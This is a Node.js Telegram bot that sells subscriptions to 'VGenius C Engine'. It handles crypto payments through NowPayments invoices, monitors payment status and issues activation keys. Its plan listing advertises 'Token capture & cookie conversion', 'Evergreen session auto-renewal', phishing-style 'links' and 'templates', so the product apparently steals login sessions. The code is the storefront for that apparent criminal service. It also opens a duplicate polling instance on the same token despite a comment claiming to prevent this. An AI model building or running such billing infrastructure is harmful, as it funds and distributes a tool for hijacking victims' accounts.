require('dotenv').config({ path: require('path').join(__dirname, '..', '.env') });
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const db = require('../backend/database/connection');
const config = require('../backend/config/env');

const bot = new TelegramBot(config.TELEGRAM_BOT_TOKEN, { polling: true });

console.log('[Telegram Bot] Started');

// Prevent multiple polling instances in the same process
let botInstance = null;
if (!botInstance) {
  botInstance = new TelegramBot(config.TELEGRAM_BOT_TOKEN, { polling: true });
  console.log('[Telegram Bot] Started');
}

// /start
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, 
    `🔐 *VGenius C Engine Bot*\n\n` +
    `Commands:\n` +
    `/plans – View subscription plans\n` +
    `/buy – Purchase a subscription\n` +
    `/key – Check your activation key status\n` +
    `/status – View your account status\n` +
    `/renew \\<key\\> – Renew an existing subscription\n` +
    `/support – Contact support`,
    { parse_mode: 'Markdown' }
  );
});

// /plans
bot.onText(/\/plans/, async (msg) => {
  const chatId = msg.chat.id;
  const [settings] = await db.query("SELECT setting_value FROM settings WHERE setting_key = 'subscription_price_usd'");
  const [durationSettings] = await db.query("SELECT setting_value FROM settings WHERE setting_key = 'subscription_duration_days'");
  const price = settings.length ? settings[0].setting_value : '50';
  const duration = durationSettings.length ? durationSettings[0].setting_value : '30';
  
  await bot.sendMessage(chatId,
    `📋 *Subscription Plans*\n\n` +
    `*Full Access* – $${price} / ${duration} days\n` +
    `• Unlimited links\n` +
    `• All templates\n` +
    `• Token capture & cookie conversion\n` +
    `• Evergreen session auto-renewal\n` +
    `• Telegram notifications\n\n` +
    `Use /buy to purchase.`,
    { parse_mode: 'Markdown' }
  );
});

// /buy
bot.onText(/\/buy/, async (msg) => {
  const chatId = msg.chat.id;
  
  const coins = [
    ['BTC', 'ETH', 'LTC'],
    ['USDT', 'USDC', 'DOGE'],
    ['BNB', 'XMR', 'SOL'],
  ];
  
  await bot.sendMessage(chatId, '💰 Select payment coin:', {
    reply_markup: {
      inline_keyboard: coins.map(row => row.map(coin => ({
        text: coin,
        callback_data: `buy_coin_${coin}`,
      }))),
    },
  });
});

// Handle coin selection
bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;
  
  if (data.startsWith('buy_coin_')) {
    const coin = data.replace('buy_coin_', '');
    await bot.answerCallbackQuery(query.id);
    
    try {
      const [settings] = await db.query("SELECT setting_value FROM settings WHERE setting_key = 'subscription_price_usd'");
      const price = settings.length ? parseFloat(settings[0].setting_value) : 50;
      
      // Create NowPayments invoice
      const ipnCallback = config.APP_URL ? `${config.APP_URL.replace(/\/$/, '')}/api/payments/ipn` : `https://your-domain.com/api/payments/ipn`;
      const npResponse = await axios.post('https://api.nowpayments.io/v1/invoice', {
        price_amount: price,
        price_currency: 'usd',
        pay_currency: coin,
        order_id: `VG_${Date.now()}`,
        order_description: 'VGenius C Engine Subscription',
        ipn_callback_url: ipnCallback,
      }, {
        headers: { 'x-api-key': config.NOWPAYMENTS_API_KEY },
      });
      
      const invoice = npResponse.data;
      
      // Store payment in DB
      await db.query(
        'INSERT INTO payments (user_id, payment_uid, coin, amount_usd, amount_crypto, wallet_address, invoice_id, status, expires_at) VALUES (NULL, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 15 MINUTE))',
        [invoice.order_id, coin, price, invoice.pay_amount, invoice.pay_address, invoice.invoice_id, 'pending']
      );
      
      const message = 
        `${coin === 'BTC' ? '₿' : coin === 'ETH' ? 'Ξ' : '💎'} *Payment Details*\n\n` +
        `Coin: ${coin}\n` +
        `Amount: ${invoice.pay_amount} ${coin}\n` +
        `USD Value: $${price}\n\n` +
        `Wallet Address:\n\`${invoice.pay_address}\`\n\n` +
        `Payment UID: \`${invoice.order_id}\`\n` +
        `⏳ Expires in 15 minutes\n\n` +
        `After payment, use /key to check status or wait for automatic delivery.`;
      
      await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
      
      // Monitor payment
      monitorPayment(invoice.invoice_id, invoice.order_id, chatId, coin, price);
      
    } catch (err) {
      console.error('[Bot] Payment creation error:', err.response?.data || err.message);
      await bot.sendMessage(chatId, '❌ Failed to create payment. Please try again later.');
    }
  }
});

// /key
bot.onText(/\/key/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, '🔑 Enter your activation key or payment UID:');
  
  bot.once('message', async (response) => {
    const code = response.text.trim();
    
    // Check if it's a payment UID
    const [payments] = await db.query('SELECT * FROM payments WHERE payment_uid = ?', [code]);
    if (payments.length) {
      const payment = payments[0];
      const statusEmoji = payment.status === 'confirmed' ? '✅' : payment.status === 'pending' ? '⏳' : '❌';
      await bot.sendMessage(chatId, `${statusEmoji} Payment Status: *${payment.status}*\nAmount: ${payment.amount_crypto} ${payment.coin}\nDate: ${payment.created_at}`, { parse_mode: 'Markdown' });
      return;
    }
    
    // Check activation key
    const [keys] = await db.query('SELECT * FROM activation_keys WHERE key_code = ?', [code]);
    if (keys.length) {
      const key = keys[0];
      await bot.sendMessage(chatId, `🔑 Key: \`${key.key_code}\`\nPlan: ${key.plan}\nDuration: ${key.duration_days} days\nStatus: ${key.status}\nUsed: ${key.times_used}/${key.usage_limit}`, { parse_mode: 'Markdown' });
    } else {
      await bot.sendMessage(chatId, '❌ Key or Payment UID not found.');
    }
  });
});

// /status
bot.onText(/\/status/, async (msg) => {
  const chatId = msg.chat.id;
  const [users] = await db.query('SELECT * FROM users WHERE telegram_id = ?', [String(chatId)]);
  
  if (!users.length) {
    await bot.sendMessage(chatId, '❌ No account linked to this Telegram ID. Set your Telegram ID in the user panel settings.');
    return;
  }
  
  const user = users[0];
  const statusEmoji = user.subscription_status === 'active' ? '🟢' : user.subscription_status === 'expired' ? '🔴' : '🟡';
  const daysLeft = user.subscription_expiry 
    ? Math.max(0, Math.ceil((new Date(user.subscription_expiry) - new Date()) / (1000 * 60 * 60 * 24)))
    : '∞';
  
  await bot.sendMessage(chatId,
    `${statusEmoji} *Account Status*\n\n` +
    `Plan: ${user.subscription_plan}\n` +
    `Status: ${user.subscription_status}\n` +
    `Days Remaining: ${daysLeft}\n` +
    `Expires: ${user.subscription_expiry || 'Never (Lifetime)'}\n` +
    `Login Key: \`${user.login_key}\``,
    { parse_mode: 'Markdown' }
  );
});

// /renew <key>
bot.onText(/\/renew (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const key = match[1].trim();
  
  const [users] = await db.query('SELECT * FROM users WHERE login_key = ?', [key]);
  if (!users.length) {
    await bot.sendMessage(chatId, '❌ No account found with that login key.');
    return;
  }
  
  const user = users[0];
  
  // Start payment flow for renewal
  const [settings] = await db.query("SELECT setting_value FROM settings WHERE setting_key = 'subscription_price_usd'");
  const price = settings.length ? parseFloat(settings[0].setting_value) : 50;
  
  const coins = [['BTC', 'ETH', 'LTC'], ['USDT', 'USDC', 'DOGE']];
  
  await bot.sendMessage(chatId, `🔄 Renew subscription for key \`${key}\` – $${price}\nSelect payment coin:`, {
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: coins.map(row => row.map(coin => ({
        text: coin,
        callback_data: `renew_${key}_${coin}`,
      }))),
    },
  });
});

// Handle renew callback
bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;
  
  if (data.startsWith('renew_')) {
    const parts = data.split('_');
    const key = parts[1];
    const coin = parts[2];
    
    await bot.answerCallbackQuery(query.id);
    
    try {
      const [users] = await db.query('SELECT * FROM users WHERE login_key = ?', [key]);
      if (!users.length) {
        await bot.sendMessage(chatId, '❌ Account not found.');
        return;
      }
      
      const [settings] = await db.query("SELECT setting_value FROM settings WHERE setting_key = 'subscription_price_usd'");
      const price = settings.length ? parseFloat(settings[0].setting_value) : 50;
      
      const npResponse = await axios.post('https://api.nowpayments.io/v1/invoice', {
        price_amount: price,
        price_currency: 'usd',
        pay_currency: coin,
        order_id: `VG_RENEW_${Date.now()}`,
        order_description: `VGenius Renewal - ${key}`,
      }, {
        headers: { 'x-api-key': config.NOWPAYMENTS_API_KEY },
      });
      
      const invoice = npResponse.data;
      
      await db.query(
        'INSERT INTO payments (user_id, payment_uid, coin, amount_usd, amount_crypto, wallet_address, invoice_id, renew_key, status, expires_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 15 MINUTE))',
        [users[0].id, invoice.order_id, coin, price, invoice.pay_amount, invoice.pay_address, invoice.invoice_id, key, 'pending']
      );
      
      await bot.sendMessage(chatId,
        `🔄 *Renewal Payment*\n\nCoin: ${coin}\nAmount: ${invoice.pay_amount} ${coin}\nAddress: \`${invoice.pay_address}\`\nUID: \`${invoice.order_id}\``,
        { parse_mode: 'Markdown' }
      );
      
      monitorPayment(invoice.invoice_id, invoice.order_id, chatId, coin, price, true, key);
    } catch (err) {
      await bot.sendMessage(chatId, '❌ Payment creation failed.');
    }
  }
});

// /support
bot.onText(/\/support/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, '📧 For support, please use the Feedback form in your user panel, or contact the admin directly.');
});

// Payment monitoring
async function monitorPayment(invoiceId, paymentUid, chatId, coin, price, isRenewal = false, renewKey = null) {
  const startTime = Date.now();
  const maxMonitorTime = 24 * 60 * 60 * 1000; // 24 hours
  const checkInterval = 30000; // 30 seconds
  
  const checkPayment = async () => {
    try {
      const response = await axios.get(`https://api.nowpayments.io/v1/invoice/${invoiceId}`, {
        headers: { 'x-api-key': config.NOWPAYMENTS_API_KEY },
      });
      
      const invoice = response.data;
      
      if (invoice.payment_status === 'finished' || invoice.payment_status === 'confirmed') {
        // Payment confirmed
        await db.query("UPDATE payments SET status = 'confirmed', confirmed_at = NOW() WHERE payment_uid = ?", [paymentUid]);
        
        if (isRenewal && renewKey) {
          // Extend existing subscription
          const [settings] = await db.query("SELECT setting_value FROM settings WHERE setting_key = 'subscription_duration_days'");
          const duration = settings.length ? parseInt(settings[0].setting_value) : 30;
          
          await db.query(
            "UPDATE users SET subscription_status = 'active', subscription_plan = 'full', subscription_expiry = DATE_ADD(COALESCE(subscription_expiry, NOW()), INTERVAL ? DAY) WHERE login_key = ?",
            [duration, renewKey]
          );
          
          await bot.sendMessage(chatId, `✅ Payment confirmed! Subscription for \`${renewKey}\` extended by ${duration} days.`, { parse_mode: 'Markdown' });
        } else {
          // Generate new activation key
          const crypto = require('crypto');
          const keyCode = 'VG_' + crypto.randomBytes(12).toString('hex').toUpperCase();
          const [settings] = await db.query("SELECT setting_value FROM settings WHERE setting_key = 'subscription_duration_days'");
          const duration = settings.length ? parseInt(settings[0].setting_value) : 30;
          const expiry = new Date();
          expiry.setFullYear(expiry.getFullYear() + 1);
          
          await db.query(
            'INSERT INTO activation_keys (key_code, plan, duration_days, usage_limit, expires_at) VALUES (?, ?, ?, ?, ?)',
            [keyCode, 'full', duration, 1, expiry]
          );
          
          await bot.sendMessage(chatId,
            `✅ *Payment Confirmed!*\n\nYour activation key:\n\`${keyCode}\`\n\nPlan: Full Access\nDuration: ${duration} days\n\nUse this key on the activation page.`,
            { parse_mode: 'Markdown' }
          );
        }
        
        // Notify admin
        if (config.TELEGRAM_ADMIN_CHAT_ID) {
          await bot.sendMessage(config.TELEGRAM_ADMIN_CHAT_ID,
            `💰 New payment confirmed!\nUID: ${paymentUid}\nCoin: ${coin}\nAmount: ${price} USD\nRenewal: ${isRenewal}`,
          );
        }
        
        return;
      }
      
      // If payment expired but still within 24h window, keep checking silently
      const elapsed = Date.now() - startTime;
      if (elapsed > maxMonitorTime) {
        await db.query("UPDATE payments SET status = 'expired' WHERE payment_uid = ?", [paymentUid]);
        return;
      }
      
      // Continue monitoring
      setTimeout(checkPayment, checkInterval);
    } catch (err) {
      console.error('[Payment Monitor] Error:', err.message);
      setTimeout(checkPayment, checkInterval * 2);
    }
  };
  
  // Start after 30 seconds
  setTimeout(checkPayment, checkInterval);
}

module.exports = bot;